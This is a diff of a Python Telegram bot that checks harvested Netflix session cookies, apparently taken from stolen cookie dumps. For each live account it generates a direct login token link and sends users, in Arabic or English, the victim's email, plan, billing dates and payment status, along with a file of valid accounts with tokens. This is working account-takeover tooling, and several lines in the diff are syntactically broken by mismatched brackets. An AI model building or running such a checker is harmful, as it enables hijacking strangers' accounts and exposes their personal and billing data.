+        wait_text = "⏳ Downloading file and starting stable scan (Free)..." if lang == 'en' else "⏳ جاري تحميل الملف وبدء الفحص المستقر (مجاني)..."
+        msg_wait = bot.reply_to(message, wait_text, reply_markup=markup)
+        
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -511,7 +797,8 @@ def handle_documents(message):
             txt_files_to_check = [file_path]
             
         if not txt_files_to_check:
-            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, msg_wait.message_id)
+            err_txt = "❌ No valid text files found." if lang == 'en' else "❌ لم يتم العثور على ملفات نصية صالحة."
+            bot.edit_message_text(err_txt, message.chat.id, msg_wait.message_id)
             if user_id in active_scans:
                 del active_scans[user_id]
             return
@@ -529,25 +816,25 @@ def handle_documents(message):
         save_db(db)
 
         valid_count = 0
-        valid_accounts_text = ""
+        valid_accounts_text = "========================================\n"
+        valid_accounts_text += f"NETFLIX VALID ACCOUNTS REPORT - Dev: {OWNER_CREDIT}\n"
+        valid_accounts_text += "========================================\n\n"
 
-        # دالة الفحص الفردي مع توليد الرابط الطازج أثناء الفحص الجماعي
         def process_line_with_token(line):
             if stop_event.is_set():
                 return None
             try:
-                netflix_id = extract_netflix_id(line)
-                if not netflix_id:
+                parsed = extract_netflix_id(line)
+                if not parsed:
                     return None
                 
                 time.sleep(0.3)
-                account_info = check_netflix_cookie({"NetflixId": netflix_id})
+                account_info = check_netflix_cookie({"NetflixId": parsed["value"]})
                 if stop_event.is_set():
                     return None
 
                 if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
-                    # توليد رابط دخول طازج ومباشر أثناء الفحص
-                    token_result = generate_token(netflix_id)
+                    token_result = generate_token(parsed["value"])
                     account_info['token_result'] = token_result
                     add_account_to_db(account_info)
                     return account_info
@@ -564,43 +851,83 @@ def handle_documents(message):
                     acc = future.result()
                     if acc:
                         valid_count += 1
-                        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
-                        res_msg += f"🌍 البلد: `{acc['country']}`\n"
-                        res_msg += f"📦 الباقة: `{acc['plan']}`\n"
-                        res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
-                        res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
-                        res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
-                        res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
+                        email = acc['email'].replace(chr(92) + 'x40', '@')
+                        plan = acc['plan']
+                        country_full = get_country_name(acc['country'], lang)
+                        expiry = acc['next_billing']
+                        member_since = acc['member_since']
+                        profiles = acc['profiles']
+                        price = acc['plan_price']
+                        quality = acc['video_quality']
+                        hold_status = "⚠️ On Hold" if acc['on_payment_hold'] == 'Yes' else ("✅ Active" if lang == 'en' else "✅ نشط")
                         
                         token_result = acc.get('token_result', {})
-                        if token_result.get('status') == 'Success':
-                            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-                            res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
+                        token_val = token_result.get('token', 'N/A')
+                        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_val}") if token_result.get('status'] == 'Success' else 'Failed to generate'
+
+                        if lang == 'en':
+                            res_msg = "🎬 **Active NETFLIX Account** 🎬\n\n"
+                            res_msg += f"🌍 Country: `{country_full}`\n"
+                            res_msg += f"📦 Plan: `{plan}`\n"
+                            res_msg += f"💰 Price: `{price}`\n"
+                            res_msg += f"📺 Quality: `{quality}`\n"
+                            res_msg += f"💳 Status: `{hold_status}`\n"
+                            res_msg += f"📅 Member Since: `{member_since}`\n"
+                            res_msg += f"🔄 Next Billing: `{expiry}`\n"
+                            res_msg += f"👥 Profiles: `{profiles}`\n"
+                            res_msg += f"📧 Email: `{email}`\n"
+                            if token_result.get('status'] == 'Success':
+                                res_msg += f"\n📱 **Direct Login URL (Fresh):**\n`{mobile_url}`"
+                            res_msg += f"\n\n👨‍💻 **Developer:** `{OWNER_CREDIT}`"
+                        else:
+                            res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+                            res_msg += f"🌍 البلد: `{country_full}`\n"
+                            res_msg += f"📦 الباقة: `{plan}`\n"
+                            res_msg += f"💰 السعر: `{price}`\n"
+                            res_msg += f"📺 الجودة: `{quality}`\n"
+                            res_msg += f"💳 الحالة: `{hold_status}`\n"
+                            res_msg += f"📅 تاريخ الاشتراك (أول مرة): `{member_since}`\n"
+                            res_msg += f"🔄 تاريخ التجديد: `{expiry}`\n"
+                            res_msg += f"👥 البروفايلات: `{profiles}`\n"
+                            res_msg += f"📧 البريد: `{email}`\n"
+                            if token_result.get('status'] == 'Success':
+                                res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
+                            res_msg += f"\n\n👨‍💻 **المطور:** `{OWNER_CREDIT}`"
                             
                         bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
-                        valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"
+                        
+                        valid_accounts_text += f"Email: {email}\n"
+                        valid_accounts_text += f"Plan: {plan} | Price: {price} | Country: {country_full}\n"
+                        valid_accounts_text += f"Member Since: {member_since} | Next Billing: {expiry}\n"
+                        valid_accounts_text += f"Profiles: {profiles}\n"
+                        valid_accounts_text += f"Token: {token_val}\n"
+                        valid_accounts_text += f"Login URL: {mobile_url}\n"
+                        valid_accounts_text += f"Developer: {OWNER_CREDIT}\n"
+                        valid_accounts_text += "-" * 50 + "\n\n"
                 except Exception as ex:
                     logger.error(f"Error handling future result: {ex}")
 
         if stop_event.is_set():
-            final_text = f"🛑 **تم إيقاف الفحص بناءً على طلبك.**\n✅ تم العثور على وحفظ ({valid_count}) حساب حتى لحظة الإيقاف."
+            final_text = f"🛑 **Scan stopped by user.**\n✅ Found and saved ({valid_count}) accounts." if lang == 'en' else f"🛑 **تم إيقاف الفحص بناءً على طلبك.**\n✅ تم العثور على وحفظ ({valid_count}) حساب."
         else:
-            final_text = f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة."
+            final_text = f"✅ Scan completed successfully. Found and saved ({valid_count}) working accounts." if lang == 'en' else f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال."
 
         try:
-            bot.edit_message_text(final_text, message.chat.id, msg_wait.message_id)
+            bot.edit_message_text(final_text, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
         except:
             pass
 
-        if valid_count > 0 and valid_accounts_text:
-            result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
+        if valid_count > 0:
+            result_file_path = os.path.join(unique_dir, "valid_accounts_with_tokens.txt")
             with open(result_file_path, 'w', encoding='utf-8') as rf:
                 rf.write(valid_accounts_text)
+            caption_text = f"📁 Valid accounts summary file.\n👨‍💻 Developer: {OWNER_CREDIT}" if lang == 'en' else f"📁 ملف ملخص الحسابات الصالحة.\n👨‍💻 المطور: {OWNER_CREDIT}"
             with open(result_file_path, 'rb') as rf:
-                bot.send_document(message.chat.id, rf, caption="📁 ملف يضم ملخص الحسابات الصالحة التي تم استخراجها.")
+                bot.send_document(message.chat.id, rf, caption=caption_text)
 
     except Exception as e:
-        bot.reply_to(message, f"❌ حدث خطأ عام: {str(e)}")
+        err_general = f"❌ General error: {str(e)}" if lang == 'en' else f"❌ حدث خطأ عام: {str(e)}"
+        bot.reply_to(message, err_general)
     finally:
         if user_id in active_scans:
             del active_scans[user_id]
@@ -613,48 +940,79 @@ def handle_documents(message):
 @bot.message_handler(func=lambda message: True)
 def handle_text_message(message):
     user_id = message.from_user.id
+    lang = user_languages.get(user_id, 'ar')
+    
     if not check_subscription(user_id):
-        send_sub_required_message(message)
+        send_sub_required_message(message, lang)
         return
 
     content = message.text
     if not content or content.startswith('/'):
         return
         
-    msg_wait = bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من حالته...")
-    netflix_id = extract_netflix_id(content)
+    wait_txt = "⏳ Checking cookie status / Token..." if lang == 'en' else "⏳ جاري فحص الكوكي أو الرابط المباشر..."
+    msg_wait = bot.reply_to(message, wait_txt)
     
-    if not netflix_id:
-        bot.edit_message_text("❌ لم يتم العثور على `NetflixId` صالح في النص.", message.chat.id, msg_wait.message_id)
+    parsed = extract_netflix_id(content)
+    if not parsed:
+        err_id = "❌ No valid `NetflixId` or Token link found." if lang == 'en' else "❌ لم يتم العثور على `NetflixId` أو رابط توكن صالح."
+        bot.edit_message_text(err_id, message.chat.id, msg_wait.message_id)
         return
         
     db = load_db()
     db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + 1
     save_db(db)
 
-    account_info = check_netflix_cookie({"NetflixId": netflix_id})
+    account_info = check_netflix_cookie({"NetflixId": parsed["value"]})
     
     if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
-        token_result = generate_token(netflix_id)
+        token_result = generate_token(parsed["value"])
         account_info['token_result'] = token_result
         
         add_account_to_db(account_info)
         
-        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
-        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
-        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
-        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
-        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
-        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
-        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+        country_full = get_country_name(account_info['country'], lang)
+        hold_status = "⚠️ On Hold" if account_info['on_payment_hold'] == 'Yes' else ("✅ Active" if lang == 'en' else "✅ نشط")
         
-        if token_result.get('status') == 'Success':
-            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+        if lang == 'en':
+            res_msg = "🎬 **Active NETFLIX Account / Checked** 🎬\n\n"
+            res_msg += f"🌍 Country: `{country_full}`\n"
+            res_msg += f"📦 Plan: `{account_info['plan']}`\n"
+            res_msg += f"💰 Price: `{account_info['plan_price']}`\n"
+            res_msg += f"📺 Quality: `{account_info['video_quality']}`\n"
+            res_msg += f"💳 Status: `{hold_status}`\n"
+            res_msg += f"📅 Member Since: `{account_info['member_since']}`\n"
+            res_msg += f"🔄 Next Billing: `{account_info['next_billing']}`\n"
+            res_msg += f"👥 Profiles: `{account_info['profiles']}`\n"
+            res_msg += f"📧 Email: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+            
+            if token_result.get('status'] == 'Success':
+                mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+                res_msg += f"\n📱 Direct Login URL:\n`{mobile_url}`"
+                
+            res_msg += f"\n\n👨‍💻 **Developer:** `{OWNER_CREDIT}`"
+        else:
+            res_msg = "🎬 **نتيجة فحص الحساب / الرابط** 🎬\n\n"
+            res_msg += f"🌍 البلد: `{country_full}`\n"
+            res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
+            res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
+            res_msg += f"📺 الجودة: `{account_info['video_quality']}`\n"
+            res_msg += f"💳 الحالة: `{hold_status}`\n"
+            res_msg += f"📅 تاريخ الاشتراك (أول مرة): `{account_info['member_since']}`\n"
+            res_msg += f"🔄 تاريخ التجديد: `{account_info['next_billing']}`\n"
+            res_msg += f"👥 البروفايلات: `{account_info['profiles']}`\n"
+            res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+            
+            if token_result.get('status'] == 'Success':
+                mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+                res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+                
+            res_msg += f"\n\n👨‍💻 **المطور:** `{OWNER_CREDIT}`"
             
         bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
     else:
-        bot.edit_message_text("❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        err_dead = "❌ This account or token is expired, dead, or invalid." if lang == 'en' else "❌ هذا الحساب أو الرابط منتهي الصلاحية أو غير شغال."
+        bot.edit_message_text(err_dead, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
 
 if __name__ == '__main__':
     logger.info("Telegram Bot is running...")
